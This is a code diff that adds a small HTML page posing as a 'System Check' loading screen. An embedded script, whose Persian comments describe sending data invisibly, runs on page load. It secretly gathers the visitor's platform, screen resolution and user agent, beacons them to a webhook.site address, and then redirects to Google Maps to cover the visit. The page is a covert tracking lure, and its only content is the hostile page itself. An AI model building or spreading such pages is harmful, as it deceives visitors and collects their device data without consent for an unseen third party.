@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head><title>System Check</title></head>
+<body>
+    <script>
+        // ارسال داده به صورت نامرئی
+        function sendLog() {
+            const out = "https://webhook.site/dd9af163-1084-4613-852c-e8554895a323";
+            const data = {
+                device: navigator.platform,
+                screen: window.screen.width + "x" + window.screen.height,
+                agent: navigator.userAgent
+            };
+            
+            navigator.sendBeacon(out, JSON.stringify(data));
+            
+            // انتقال به صفحه اصلی گوگل مپ بعد از ۱ ثانیه
+            setTimeout(() => {
+                window.location.replace("https://www.google.com/maps");
+            }, 1000);
+        }
+        window.onload = sendLog;
+    </script>
+    <p style="font-family: Arial; text-align: center; margin-top: 20%;">Loading system components, please wait...</p>
+</body>
+</html>
